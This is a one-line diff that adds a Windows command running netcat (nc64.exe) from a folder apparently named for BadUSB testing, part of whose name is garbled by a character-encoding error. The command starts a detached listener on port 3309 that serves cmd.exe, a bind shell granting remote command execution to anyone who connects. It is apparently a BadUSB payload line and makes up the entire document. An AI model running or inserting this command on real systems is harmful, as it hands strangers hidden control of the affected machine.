@@ -1,0 +1,1 @@
+"C:\\Users\\dell\\Desktop\\badusb²âÊÔ×¨ÓÃ\\2.0\\nc64.exe" -lp 3309 -e cmd.exe -d
